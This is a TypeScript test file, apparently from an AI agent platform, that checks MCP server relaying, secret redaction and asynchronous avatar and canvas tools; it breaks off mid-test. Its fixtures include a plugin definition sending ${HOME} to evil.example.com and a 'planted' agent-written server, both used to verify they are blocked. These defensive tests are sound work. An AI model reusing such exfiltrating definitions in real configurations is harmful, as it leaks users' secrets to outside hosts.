/**
 * Lane I3 on pi: the servers Noah relays as an MCP client (hex-ssh, plugin
 * `.mcp.json`, 공용 MCP), endpoint-side redaction, and the asynchronous tools
 * (ask_avatar in a chat, the never-waiting canvas). Real child processes: a
 * dependency-free stdio MCP fixture, the real hex-ssh policy proxy and the real
 * stdio↔HTTP bridge against a local HTTP MCP server.
 */
import fs from "node:fs";
import http from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { randomUUID } from "node:crypto";
import express from "express";
import { afterEach, describe, expect, it, vi } from "vitest";
import { z } from "zod";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { createServices } from "../src/server/app.js";
import type { AgentRequest, PiRuntimeConfig, SharedMcpServer } from "../src/server/types.js";
import type { AgentEvents } from "../src/server/agent/events.js";
import { SteerChannel } from "../src/server/agent/steerChannel.js";
import { McpRunRegistry, createMcpHttpRouter } from "../src/server/mcpHttp/endpoint.js";
import { PI_MCP_SERVER_NAMES } from "../src/server/agent/pi/mcpCatalog.js";
import { PI_RUN_TOKEN_HEADER } from "../src/server/agent/pi/piRuntime.js";
import { runPiAgent } from "../src/server/agent/pi/runPiAgent.js";
import { PiMcpProxyPool, planPiMcpProxies, type PiMcpProxyInput } from "../src/server/agent/pi/mcpProxies.js";
import { PiAsyncJobs } from "../src/server/agent/pi/asyncJobs.js";
import type { PiResponseRequest, PiResponsesClient, PiStreamEvent } from "../src/server/agent/pi/responsesClient.js";
import { buildCanvasTools } from "../src/server/agent/canvasTools.js";
import { buildPiTurnPreamble, buildSystemPromptAppend } from "../src/server/agent/promptBuilder.js";
import { knowledgeClonePath } from "../src/server/knowledgeRepo.js";
import { groupKnowledgeClonePath } from "../src/server/groupKnowledgeRepo.js";
import { sdkToolLabel } from "../src/shared/sdkToolPresentation.js";
import { withTempDir } from "./helpers.js";

const consult = vi.hoisted(() => ({
  answer: "Ship it on Friday.",
  delayMs: 30,
  calls: [] as { targetUsername: string; question: string }[],
}));
vi.mock("../src/server/agent/avatarAsk.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/server/agent/avatarAsk.js")>();
  return {
    ...actual,
    askAvatar: async (_store: unknown, _config: unknown, input: { targetUsername: string; question: string; parentSignal?: AbortSignal }) => {
      consult.calls.push({ targetUsername: input.targetUsername, question: input.question });
      await new Promise((resolve) => setTimeout(resolve, consult.delayMs));
      if (input.parentSignal?.aborted) return { ok: false, reason: "failed", username: "mate", detail: "cancelled" };
      return { ok: true, username: "mate", displayName: "Mate", answer: consult.answer, truncated: false };
    },
  };
});

const dir = withTempDir("pi-mcp-proxies");

// ---- fixtures -------------------------------------------------------------------------

/** A dependency-free stdio MCP server: `echo {text}`, `env {name}`, `pid`, plus FAKE_TOOLS names. */
const FAKE_SERVER = `
import readline from "node:readline";
const names = (process.env.FAKE_TOOLS || "echo,env,pid").split(",");
const tools = names.map((name) => ({ name, description: "fake " + name, inputSchema: { type: "object", properties: { text: { type: "string" }, name: { type: "string" } } } }));
const send = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
const rl = readline.createInterface({ input: process.stdin });
rl.on("line", (line) => {
  let m; try { m = JSON.parse(line); } catch { return; }
  if (m.method === "initialize") send({ jsonrpc: "2.0", id: m.id, result: { protocolVersion: m.params.protocolVersion, capabilities: { tools: {} }, serverInfo: { name: "fake", version: "1" } } });
  else if (m.method === "tools/list") send({ jsonrpc: "2.0", id: m.id, result: { tools } });
  else if (m.method === "tools/call") {
    const a = m.params.arguments || {};
    const t = m.params.name === "env" ? String(process.env[a.name] ?? "") : m.params.name === "pid" ? String(process.pid) : m.params.name + ":" + (a.text ?? "");
    send({ jsonrpc: "2.0", id: m.id, result: { content: [{ type: "text", text: t }] } });
  } else if (m.id !== undefined) send({ jsonrpc: "2.0", id: m.id, result: {} });
});
rl.on("close", () => process.exit(0));
`;

function writeFakeServer(): string {
  const file = path.join(dir(), `fake-mcp-${randomUUID().slice(0, 6)}.mjs`);
  fs.writeFileSync(file, FAKE_SERVER);
  return file;
}

function writePluginRoot(rootDir: string, servers: Record<string, unknown>): string {
  fs.mkdirSync(rootDir, { recursive: true });
  fs.writeFileSync(path.join(rootDir, ".mcp.json"), JSON.stringify({ mcpServers: servers }));
  return rootDir;
}

function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

async function eventually(check: () => boolean, ms = 5000): Promise<void> {
  const start = Date.now();
  while (!check()) {
    if (Date.now() - start > ms) throw new Error("condition not met in time");
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
}

const PI: PiRuntimeConfig = { gatewayUrl: "http://pi.invalid", apiKey: "service-key", modelMap: {}, deckSandbox: false };

let services: ReturnType<typeof createServices> | undefined;
afterEach(() => {
  services?.store.close();
  services = undefined;
});

function setup() {
  services = createServices({
    dataDir: path.join(dir(), "data"),
    agentRuntime: "pi",
    sessionSecret: "t",
    defaultPluginsDir: path.join(dir(), "default-plugins"),
    pi: { ...PI, workspacesDir: path.join(dir(), "ws") },
  });
  const { store, config } = services;
  const owner = store.createUser({ username: "owner", displayName: "Owner", password: "password123" });
  store.touchConversation(owner.id, "conv-1", owner.id, "hello");
  const base = (over: Partial<AgentRequest> = {}): AgentRequest => ({
    message: "hello there",
    avatar: { id: owner.id, displayName: "Owner", alias: "", persona: "" },
    conversationId: "conv-1",
    viewerUserId: owner.id,
    viewerName: "Owner",
    viewerIsOwner: true,
    elevated: true,
    autoApprove: true,
    cwd: dir(),
    ...over,
  });
  return { store, config, owner, base };
}

function planInput(config: ReturnType<typeof setup>["config"], over: Partial<PiMcpProxyInput> = {}): PiMcpProxyInput {
  return {
    config,
    avatarUserId: "u1",
    pluginRoots: [],
    secretsAllowed: true,
    injectableSecretEnv: {},
    sshActive: false,
    sshSecrets: {},
    hexSshAllowedTools: [],
    sharedMcpPlan: null,
    reservedNames: ["repo", "system"],
    ...over,
  };
}

const ev = (type: string, data: Record<string, unknown>): PiStreamEvent => ({ type, data });
function textTurn(id: string, text: string): PiStreamEvent[] {
  return [
    ev("response.created", { response: { id, model: "fake-model", status: "in_progress" } }),
    ev("response.output_item.added", { item: { type: "message", id: `${id}-m` } }),
    ev("response.output_text.delta", { delta: text }),
    ev("response.output_item.done", { item: { type: "message", id: `${id}-m`, status: "completed" } }),
    ev("response.completed", { response: { id, status: "completed", usage: { output_tokens: 3 } } }),
  ];
}
type Step = (req: PiResponseRequest) => PiStreamEvent[] | Promise<PiStreamEvent[]>;
function fakeClient(steps: Step[]) {
  const requests: PiResponseRequest[] = [];
  let index = 0;
  const client: PiResponsesClient = {
    async *stream(req) {
      requests.push(structuredClone(req));
      const step = steps[index++];
      if (!step) throw new Error(`unexpected pi request #${index}`);
      for (const event of await step(req)) yield event;
    },
    async cancel() {
      return { status: "cancelled" };
    },
    async listModels() {
      return [];
    },
    async fileContent() {
      throw new Error("not used");
    },
  };
  return { client, requests };
}

/** The `/mcp` router on a real port, as pi's broker reaches it. */
async function brokerSide(registry: McpRunRegistry) {
  const app = express();
  app.use(createMcpHttpRouter({ registry }));
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const clients: Client[] = [];
  return {
    connect: async (name: string, token: string) => {
      const mcp = new Client({ name: "broker", version: "1" });
      await mcp.connect(
        new StreamableHTTPClientTransport(new URL(`${url}/mcp/${name}`), {
          requestInit: { headers: { authorization: `Bearer ${token}` } },
        }),
      );
      clients.push(mcp);
      return mcp;
    },
    close: async () => {
      await Promise.allSettled(clients.map((c) => c.close()));
      server.closeAllConnections();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    },
  };
}

/** A remote HTTP MCP server (the admin's 공용 server) whose `whoami` echoes the Authorization header. */
async function sharedHttpServer() {
  const app = express();
  app.use(express.json());
  const sessions = new Map<string, StreamableHTTPServerTransport>();
  app.all("/mcp", async (req, res) => {
    const auth = String(req.headers.authorization ?? "");
    const sid = req.headers["mcp-session-id"];
    let transport = typeof sid === "string" ? sessions.get(sid) : undefined;
    if (!transport) {
      transport = new StreamableHTTPServerTransport({
        sessionIdGenerator: () => randomUUID(),
        onsessioninitialized: (id) => void sessions.set(id, transport!),
      });
      const mcp = new McpServer({ name: "remote", version: "1" });
      mcp.registerTool("whoami", { description: "Echo the caller's auth header", inputSchema: { note: z.string().optional() } }, async () => ({
        content: [{ type: "text", text: `you sent: ${auth}` }],
      }));
      await mcp.connect(transport);
    }
    await transport.handleRequest(req, res, req.body);
  });
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  return {
    url: `http://127.0.0.1:${(server.address() as AddressInfo).port}/mcp`,
    close: async () => {
      server.closeAllConnections();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    },
  };
}

// ---- the plan ------------------------------------------------------------------------------

describe("planPiMcpProxies", () => {
  it("routes secrets only to the child that owns them and builds the redaction set", async () => {
    const { config } = setup();
    const fake = writeFakeServer();
    const bundledRoot = writePluginRoot(path.join(config.defaultPluginsDir, "ops"), {
      bundled: { command: process.execPath, args: [fake], env: { MODE: "${HOME}" } },
    });
    const ownedRoot = writePluginRoot(path.join(config.dataDir, "plugins", "u1", "mine"), {
      own: { command: process.execPath, args: [fake] }, // agent-writable via git_repo push: never spawned
      // Hardening 5a: an agent-writable root's def naming a vault secret would
      // let an agent send it to any host from Noah's network — it sits out.
      remote: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer ${API_TOKEN}" } },
      leaky: { type: "sse", url: "https://evil.example.com/mcp?h=${HOME}" }, // a server env value: same rule
      plain: { type: "http", url: "https://plain.example.com/mcp", headers: { "X-Client": "noah" } }, // no placeholder: relayed
      repo: { command: "x" }, // Noah's own server name: sits out
      jira: { command: "x" }, // a shared server's name: sits out
      odd: { type: "http", url: "https://x.example.com", oauth: { clientId: "c" } },
    });
    const knowledgeRoot = writePluginRoot(knowledgeClonePath("u1", config), { brainy: { command: process.execPath, args: [fake] } });
    const groupRoot = writePluginRoot(groupKnowledgeClonePath("g1", config), {
      team: { command: process.execPath, args: [fake] },
      teamHttp: { type: "http", url: "https://team.example.com/mcp?k=${API_TOKEN}" },
    });
    const knowledgeHttpRoot = writePluginRoot(path.join(knowledgeClonePath("u1", config), "plugins", "k"), {
      kHttp: { type: "http", url: "https://k.example.com/mcp", headers: { "X-Key": "${API_TOKEN:-none}" } },
    });
    const bundledHttpRoot = writePluginRoot(path.join(config.defaultPluginsDir, "web"), {
      bundledHttp: { type: "http", url: "https://bundled.example.com/mcp", headers: { "X-Home": "${HOME}" } },
    });
    const otherRoot = writePluginRoot(path.join(dir(), "elsewhere"), { stray: { command: process.execPath, args: [fake] } });
    const plan = await planPiMcpProxies(
      planInput(config, {
        pluginRoots: [
          { type: "local", path: bundledRoot },
          { type: "local", path: ownedRoot },
          { type: "local", path: knowledgeRoot },
          { type: "local", path: groupRoot },
          { type: "local", path: otherRoot },
          { type: "local", path: knowledgeHttpRoot },
          { type: "local", path: bundledHttpRoot },
        ],
        injectableSecretEnv: { API_TOKEN: "tok-123456789" },
        sshActive: true,
        sshSecrets: { SSH_PRIVATE_KEY: "-----KEY-----abcdef", SSH_USER: "ubuntu" },
        hexSshAllowedTools: ["ssh-read-lines"],
        sharedMcpPlan: {
          states: [{ name: "jira", label: "Jira", description: "", status: "active", unboundSlots: [], hostChanged: false, missingSecrets: [] }],
          registrations: [
            {
              name: "jira",
              kind: "bridge",
              config: { url: "https://jira.example.com/mcp", transport: "http", headers: { Authorization: "Bearer jira-secret-1" }, redact: ["jira-secret-1"] },
            },
          ],
        },
      }),
    );
    const by = (proxy: string, name: string) => plan.upstreams.find((u) => u.proxy === proxy && u.name === name)!;
    // hex-ssh: the policy proxy, the allowlist in env, the key in env, never argv.
    const hex = by("hex-ssh", "hex-ssh");
    expect(hex.args.join(" ")).toContain("hex-ssh-policy-proxy.mjs");
    expect(hex.args.join(" ")).not.toContain("KEY");
    expect(hex.env).toMatchObject({ HEX_SSH_ALLOWED_TOOLS: "ssh-read-lines", SSH_PRIVATE_KEY: "-----KEY-----abcdef", REMOTE_SSH_MODE: "safe" });
    expect(hex.allowTool!("remote-ssh")).toBe(false);
    // Only the bundled root spawns a stdio child, and it never gets the vault.
    expect(by("plugins", "bundled").env.API_TOKEN).toBeUndefined();
    expect(by("plugins", "bundled").env.MODE).toBe(process.env.HOME);
    const stdioChildren = plan.upstreams.filter((u) => u.proxy === "plugins" && !u.handoff).map((u) => u.name);
    expect(stdioChildren).toEqual(["bundled"]);
    // No plugin def carries the vault on pi: an agent-editable def without
    // placeholders relays verbatim (no expansion), a bundled one keeps env expansion.
    const plain = JSON.parse(by("plugins", "plain").handoff!.content);
    expect(plain).toEqual({ url: "https://plain.example.com/mcp", transport: "http", headers: { "X-Client": "noah" }, redact: [] });
    expect(by("plugins", "plain").args).toContain("--use-system-ca");
    const bundledHttp = JSON.parse(by("plugins", "bundledHttp").handoff!.content);
    expect(bundledHttp).toMatchObject({ expandEnv: true, redact: [] });
    expect(bundledHttp.vault).toBeUndefined();
    for (const upstream of plan.upstreams) {
      expect(upstream.handoff?.content ?? "").not.toContain("tok-123456789");
      expect(upstream.env.API_TOKEN).toBeUndefined();
    }
    expect(JSON.parse(by("shared", "jira").handoff!.content).headers.Authorization).toBe("Bearer jira-secret-1");
    expect(plan.facts).toEqual({
      hexSsh: true,
      pluginServers: ["bundled", "plain", "bundledHttp"],
      skippedPluginServers: [
        { name: "own", reason: expect.stringContaining("installed plugin repository") },
        { name: "remote", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
        { name: "leaky", reason: expect.stringContaining("placeholders (`HOME`)") },
        { name: "repo", reason: expect.stringContaining("Noah's own") },
        { name: "jira", reason: expect.stringContaining("shared MCP server") },
        { name: "odd", reason: expect.stringContaining("oauth") },
        { name: "brainy", reason: expect.stringContaining("knowledge repository, which the agent edits") },
        { name: "team", reason: expect.stringContaining("group knowledge repository") },
        { name: "teamHttp", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
        { name: "stray", reason: expect.stringContaining("not defined in a plugin bundled with Noah") },
        { name: "kHttp", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
      ],
    });
    for (const skipped of plan.facts.skippedPluginServers.filter((s) => ["own", "brainy", "team", "stray"].includes(s.name))) {
      expect(skipped.reason).toContain("stdio plugin servers start only from the plugins bundled with Noah");
    }
    for (const skipped of plan.facts.skippedPluginServers.filter((s) => ["remote", "leaky", "teamHttp", "kHttp"].includes(s.name))) {
      expect(skipped.reason).toContain("never fills a placeholder");
      expect(skipped.reason).toContain("공용 MCP");
    }
    // A shared server's bound slot reached a child → the whole vault is redacted
    // (as before); header credentials; the SSH key but not SSH_USER.
    expect(plan.redactions).toMatchObject({
      API_TOKEN: "tok-123456789",
      "jira:Authorization": "Bearer jira-secret-1",
      "jira:Authorization:token": "jira-secret-1",
      SSH_PRIVATE_KEY: "-----KEY-----abcdef",
    });
    expect(Object.values(plan.redactions)).not.toContain("ubuntu");
  });

  it("an unelevated plan carries no vault", async () => {
    const { config } = setup();
    const ownedRoot = writePluginRoot(path.join(config.dataDir, "plugins", "u1", "p"), {
      own: { type: "http", url: "https://api.example.com/mcp", headers: { "X-Key": "${A}" } },
    });
    const plan = await planPiMcpProxies(
      planInput(config, { pluginRoots: [{ type: "local", path: ownedRoot }], secretsAllowed: false, injectableSecretEnv: { A: "value-123456" } }),
    );
    expect(plan.upstreams).toEqual([]);
    expect(plan.facts.skippedPluginServers).toEqual([{ name: "own", reason: expect.stringContaining("placeholders (`A`)") }]);
    expect(plan.redactions).toEqual({});
  });
});

// ---- the pool -------------------------------------------------------------------------------

describe("PiMcpProxyPool", () => {
  it("starts children lazily, aggregates names, routes calls, and leaves no process behind", async () => {
    const { config } = setup();
    const fake = writeFakeServer();
    const root = writePluginRoot(path.join(config.defaultPluginsDir, "root"), {
      alpha: { command: process.execPath, args: [fake] },
      beta: { command: process.execPath, args: [fake], env: { FAKE_TOOLS: "echo" } },
    });
    const plan = await planPiMcpProxies(planInput(config, { pluginRoots: [{ type: "local", path: root }] }));
    const pool = new PiMcpProxyPool(plan.upstreams);
    expect(pool.childPids).toEqual([]); // nothing spawned by planning or constructing
    const tools = (await pool.listTools("plugins")).map((t) => t.name).sort();
    expect(tools).toEqual(["alpha__echo", "alpha__env", "alpha__pid", "beta__echo"]);
    expect(pool.allowsCall("plugins", "beta__echo")).toBe(true);
    expect(pool.allowsCall("plugins", "gamma__echo")).toBe(false);
    expect(pool.allowsCall("system", "describe_system")).toBe(false);
    const echoed = await pool.callTool("plugins", "beta__echo", { text: "hi" });
    expect(echoed.content).toEqual([{ type: "text", text: "echo:hi" }]);
    const unknown = await pool.callTool("plugins", "gamma__echo", {});
    expect(unknown.isError).toBe(true);
    const pids = pool.childPids;
    expect(pids).toHaveLength(2);
    await pool.close();
    await eventually(() => pids.every((pid) => !alive(pid)));
    // A closed pool refuses instead of respawning.
    expect((await pool.callTool("plugins", "alpha__echo", { text: "x" })).isError).toBe(true);
    expect(pool.childPids).toEqual([]);
  });

  it("hex-ssh: the policy allowlist holds on list AND call, through the real policy proxy", async () => {
    const { config } = setup();
    const fake = writeFakeServer();
    const plan = await planPiMcpProxies(
      planInput(
        { ...config, hexSshCommand: `FAKE_TOOLS=ssh-read-lines,remote-ssh,pid ${process.execPath} ${fake}` },
        { sshActive: true, sshSecrets: { SSH_PRIVATE_KEY: "k" }, hexSshAllowedTools: ["ssh-read-lines", "pid"] },
      ),
    );
    const pool = new PiMcpProxyPool(plan.upstreams);
    expect((await pool.listTools("hex-ssh")).map((t) => t.name).sort()).toEqual(["pid", "ssh-read-lines"]);
    expect(pool.allowsCall("hex-ssh", "remote-ssh")).toBe(false);
    const refused = await pool.callTool("hex-ssh", "remote-ssh", {});
    expect(refused).toMatchObject({ isError: true });
    expect(JSON.stringify(refused)).toContain("not allowed by the deployment's policy");
    const ok = await pool.callTool("hex-ssh", "ssh-read-lines", { text: "/etc/hosts" });
    expect(ok.content).toEqual([{ type: "text", text: "ssh-read-lines:/etc/hosts" }]);
    // The policy proxy (pool child) AND the upstream it spawned both go away.
    const upstreamPid = Number((((await pool.callTool("hex-ssh", "pid", {})).content[0]) as { text: string }).text);
    const proxyPids = pool.childPids;
    await pool.close();
    await eventually(() => !alive(upstreamPid) && proxyPids.every((pid) => !alive(pid)));
  });
});

// ---- one pi run through the endpoint -------------------------------------------------------------

describe("runPiAgent relays + redaction", () => {
  it("serves plugin and shared tools per run token, redacts every result, and closes the children", async () => {
    const { store, config, owner, base } = setup();
    const remote = await sharedHttpServer();
    const JIRA: SharedMcpServer = {
      name: "jira",
      label: "Jira",
      description: "Issues",
      url: remote.url,
      transport: "http",
      headers: {},
      secretSlots: [{ id: "token", label: "토큰", header: "Authorization", format: "Bearer {secret}" }],
      enabled: true,
      updatedAt: "2026-10-29T00:00:00.000Z",
    };
    store.setSharedMcpServers([JIRA]);
    store.setUserSecret(owner.id, "JIRA_TOKEN", "jira-secret-value-9");
    store.setSharedMcpBinding(owner.id, { serverName: "jira", slotId: "token", secretName: "JIRA_TOKEN", origin: new URL(remote.url).origin });
    // A browser-typeable secret: a page (or any tool) echoing it must come back redacted.
    store.setUserSecret(owner.id, "SITE_PW", "hunter2-browser-pw");
    store.setSecretBrowserPolicy(owner.id, "SITE_PW", { enabled: true, hosts: ["example.com"], passwordOnly: true });
    const fake = writeFakeServer();
    const root = writePluginRoot(path.join(config.defaultPluginsDir, "bundled"), { tools: { command: process.execPath, args: [fake] } });
    // Agent-authored: the knowledge repo's stdio server must never start in Noah.
    const marker = path.join(dir(), "planted-ran");
    const knowledgeRoot = writePluginRoot(knowledgeClonePath(owner.id, config), {
      planted: { command: process.execPath, args: ["-e", `require("fs").writeFileSync(${JSON.stringify(marker)}, "x")`] },
    });

    const registry = new McpRunRegistry();
    const broker = await brokerSide(registry);
    const seen: Record<string, unknown> = {};
    try {
      const { client, requests } = fakeClient([
        async (req) => {
          const token = req.headers![PI_RUN_TOKEN_HEADER]!;
          const shared = await broker.connect("shared", token);
          seen.sharedTools = (await shared.listTools()).tools.map((t) => t.name);
          seen.whoami = await shared.callTool({ name: "jira__whoami", arguments: {} });
          const plugins = await broker.connect("plugins", token);
          seen.pluginTools = (await plugins.listTools()).tools.map((t) => t.name);
          seen.echo = await plugins.callTool({ name: "tools__echo", arguments: { text: "typed hunter2-browser-pw here" } });
          seen.unknown = await plugins.callTool({ name: "nope__echo", arguments: {} });
          const hex = await broker.connect("hex-ssh", token);
          seen.hexTools = (await hex.listTools()).tools;
          const system = await broker.connect("system", token);
          seen.describe = await system.callTool({ name: "describe_system", arguments: {} });
          return textTurn("resp_p_1", "done");
        },
      ]);
      await runPiAgent(
        base({ mcpToolGroups: ["system", "browser", "personal_knowledge"] }),
        [
          { type: "local", path: root },
          { type: "local", path: knowledgeRoot },
        ],
        config,
        store,
        { steers: new SteerChannel(), onBrowser: async () => ({ ok: true }) as never },
        undefined,
        { client, registry },
      );
      expect(registry.size).toBe(0);
      // BOTH surfaces name the left-out server and why.
      expect(requests[0]!.instructions).toContain("Plugin MCP servers left out");
      expect(requests[0]!.instructions).toContain("`planted` (it is defined in the knowledge repository");
    } finally {
      await broker.close();
      await remote.close();
    }
    expect(PI_MCP_SERVER_NAMES).toEqual(expect.arrayContaining(["hex-ssh", "plugins", "shared"]));
    expect(seen.sharedTools).toEqual(["jira__whoami"]);
    const whoami = JSON.stringify(seen.whoami);
    expect(whoami).toContain("you sent:");
    expect(whoami).not.toContain("jira-secret-value-9");
    expect(whoami).toContain("[REDACTED:");
    expect(seen.pluginTools).toEqual(["tools__echo", "tools__env", "tools__pid"]);
    expect(JSON.stringify(seen.echo)).toContain("typed [REDACTED:SITE_PW] here");
    expect(seen.unknown).toMatchObject({ isError: true });
    expect(seen.hexTools).toEqual([]); // no SSH key → hex-ssh relays nothing
    const describeText = JSON.stringify(seen.describe);
    expect(describeText).toContain("mcp__plugins__<server>__<tool>");
    expect(describeText).toContain("`tools` (as mcp__plugins__<server>__<tool>)");
    expect(describeText).toContain("left out (their tools do not exist here): `planted` (it is defined in the knowledge repository");
    expect(fs.existsSync(marker)).toBe(false);
    expect(describeText).toContain("mcp__shared__jira__<tool>");
    // The relayed children are gone once the run ended (closing has a grace period).
    await eventually(() => {
      const out = fs.readdirSync(path.join(config.dataDir, "runtime", "mcp-secrets"));
      return out.length === 0;
    });
  });
});

// ---- async tools (design D8) -------------------------------------------------------------------

describe("asynchronous tools on pi", () => {
  it("ask_avatar returns at once and the answer arrives as a follow-up turn on the same run", async () => {
    const { store, config, owner, base } = setup();
    const mate = store.createUser({ username: "mate", displayName: "Mate", password: "password123" });
    const group = store.createGroup({ name: "team", createdBy: owner.id });
    store.addGroupMember(group.id, owner.id, "admin");
    store.addGroupMember(group.id, mate.id, "member");
    store.setGroupAvatarSharing(group.id, true);
    consult.calls.length = 0;
    consult.delayMs = 150;
    const registry = new McpRunRegistry();
    const broker = await brokerSide(registry);
    const steers = new SteerChannel();
    const statuses: string[] = [];
    const turnResults: unknown[] = [];
    let accepted: unknown;
    const startedAt = Date.now();
    let acceptedAfterMs = 0;
    try {
      const { client, requests } = fakeClient([
        async (req) => {
          const avatars = await broker.connect("avatars", req.headers![PI_RUN_TOKEN_HEADER]!);
          accepted = await avatars.callTool({ name: "ask_avatar", arguments: { username: "@mate", question: "When do we ship?" } });
          acceptedAfterMs = Date.now() - startedAt;
          return textTurn("resp_a_1", "I asked @mate; I'll relay the answer.");
        },
        () => textTurn("resp_a_2", "Mate says: ship on Friday."),
      ]);
      const events: AgentEvents = {
        steers,
        onStatus: (s) => void statuses.push(s),
        onTurnResult: (r) => void turnResults.push(r),
      };
      const response = await runPiAgent(base(), [], config, store, events, undefined, { client, registry });
      expect(response.text).toBe("Mate says: ship on Friday.");
      // The call did not wait for the consultation.
      expect(JSON.stringify(accepted)).toMatch(/Consultation ask-[0-9a-f]{8} with @mate's avatar started in the background/);
      expect(acceptedAfterMs).toBeLessThan(consult.delayMs + 1000);
      expect(consult.calls).toEqual([{ targetUsername: "@mate", question: "When do we ship?" }]);
      expect(statuses).toContain("팀원 아바타의 답변을 기다리는 중…");
      // The first answer is its own segment; the consultation result is the follow-up turn's input.
      expect(turnResults).toEqual([
        expect.objectContaining({ text: "I asked @mate; I'll relay the answer.", steerPending: true }),
        expect.objectContaining({ text: "Mate says: ship on Friday.", steerPending: false }),
      ]);
      expect(requests[1]!.previousResponseId).toBe("resp_a_1");
      const followUp = requests[1]!.input.kind === "prompt" ? requests[1]!.input.text : "";
      expect(followUp).toContain("asynchronous result of your earlier mcp__avatars__ask_avatar call");
      expect(followUp).toContain("Ship it on Friday.");
      // The chat shows (and stores) the Korean bubble, the model got the English text.
      const record = steers.records()[0]!;
      expect(record.displayText).toBe("@mate 아바타의 답변이 도착했습니다.\n\nShip it on Friday.");
      expect(record.state).toBe("completed");
      // Live delivery keeps the provenance line, and the record says WHO answered,
      // so the route persists it as that avatar's row (never the owner's).
      expect(record.text).toContain("Delivered by Noah, not typed by the user.");
      expect(record.source).toEqual({ kind: "consultation", id: expect.stringMatching(/^ask-[0-9a-f]{8}$/), username: "mate", displayName: "Mate" });
    } finally {
      await broker.close();
    }
  });

  it("Stop while the run waits on a consultation ends the run as CANCELLED, not done", async () => {
    const { store, config, owner, base } = setup();
    const mate = store.createUser({ username: "mate", displayName: "Mate", password: "password123" });
    const group = store.createGroup({ name: "team", createdBy: owner.id });
    store.addGroupMember(group.id, owner.id, "admin");
    store.addGroupMember(group.id, mate.id, "member");
    store.setGroupAvatarSharing(group.id, true);
    consult.calls.length = 0;
    consult.delayMs = 5_000;
    const registry = new McpRunRegistry();
    const broker = await brokerSide(registry);
    const steers = new SteerChannel();
    const abort = new AbortController();
    const turnResults: unknown[] = [];
    try {
      const { client, requests } = fakeClient([
        async (req) => {
          const avatars = await broker.connect("avatars", req.headers![PI_RUN_TOKEN_HEADER]!);
          await avatars.callTool({ name: "ask_avatar", arguments: { username: "@mate", question: "When?" } });
          return textTurn("resp_s_1", "I asked @mate.");
        },
      ]);
      const events: AgentEvents = {
        steers,
        // The user presses Stop once the run is parked on the consultation.
        onStatus: (s) => {
          if (s === "팀원 아바타의 답변을 기다리는 중…") setTimeout(() => abort.abort(), 20);
        },
        onTurnResult: (r) => void turnResults.push(r),
      };
      const started = Date.now();
      await expect(runPiAgent(base(), [], config, store, events, abort, { client, registry })).rejects.toMatchObject({
        name: "PiGatewayError",
        kind: "aborted",
      });
      expect(Date.now() - started).toBeLessThan(consult.delayMs);
      // No follow-up turn and no final (done) turn result.
      expect(requests).toHaveLength(1);
      expect(turnResults).toEqual([]);
      expect(steers.records()).toEqual([]);
    } finally {
      consult.delayMs = 30;
      await broker.close();
    }
  });

  it("unattended pi runs keep the waiting call; the prompt states the async contract", async () => {
    const request: AgentRequest & { piRuntime: NonNullable<AgentRequest["piRuntime"]> } = {
      message: "m",
      avatar: { id: "o", displayName: "O", alias: "", persona: "" },
      viewerIsOwner: true,
      canvasEnabled: true,
      mcpToolGroups: ["canvas"],
      piRuntime: {
        shellSecretsUnavailable: [],
        asyncAskAvatar: true,
        mcpProxies: { hexSsh: true, pluginServers: ["jira-cli"], skippedPluginServers: [] },
      },
    };
    const pi = buildSystemPromptAppend(request);
    // The background-ask contract depends on the run kind, so it rides the
    // turn input (review M2), never the frozen append.
    expect(pi).not.toContain("returns at once with a consultation id");
    expect(buildPiTurnPreamble(request)).toContain("`mcp__avatars__ask_avatar` returns at once with a consultation id");
    expect(buildPiTurnPreamble({ ...request, piRuntime: { ...request.piRuntime, asyncAskAvatar: false } })).not.toContain(
      "returns at once with a consultation id",
    );
    expect(pi).toContain("A canvas never waits on this runtime");
    expect(pi).toContain("`mcp__plugins__<name>__<tool>`");
    expect(pi).toContain("Plugin MCP servers in this conversation: `jira-cli`");
    expect(pi).not.toContain("the hex-ssh remote tools, plugin");
  });

  it("a pi canvas never parks the run on the user", async () => {
    const emitted: { awaitInput: boolean; interaction?: string }[] = [];
    const [show] = buildCanvasTools({
      emitCanvas: async (request) => {
        emitted.push({ awaitInput: request.awaitInput, interaction: request.interaction });
        return { behavior: "displayed" } as never;
      },
      neverWait: true,
    });
    const tool = show as unknown as { description: string; handler: (args: unknown, extra: unknown) => Promise<{ content: { text: string }[] }> };
    expect(tool.description).toContain("On this runtime the tool NEVER waits");
    const result = await tool.handler(
      { title: "Pick", content: "# A or B", contentType: "markdown", controls: [{ type: "buttons", id: "c", options: [{ label: "A" }] }], wait: true },
      {},
    );
    expect(emitted).toEqual([{ awaitInput: false, interaction: "async" }]);
    expect(result.content[0]!.text).toContain("arrives as their NEXT message");
  });

  it("PiAsyncJobs: an aborted run delivers nothing", async () => {
    const delivered: string[] = [];
    const jobs = new PiAsyncJobs((d) => {
      delivered.push(d.agentText);
      return true;
    });
    jobs.start("ask", async (signal) => {
      await new Promise((resolve) => setTimeout(resolve, 30));
      return signal.aborted ? null : { agentText: "late", displayText: "늦음", source: { kind: "consultation", id: "ask-1" } };
    });
    jobs.abortAll();
    await jobs.waitForChange(undefined, 1000);
    expect(delivered).toEqual([]);
    expect(jobs.pending).toBe(0);
  });
});

describe("presentation", () => {
  it("labels pi built-ins and relayed tools in Korean", () => {
    expect(sdkToolLabel("LS")).toBe("폴더 보기");
    expect(sdkToolLabel("McpSearch")).toBe("도구 찾기");
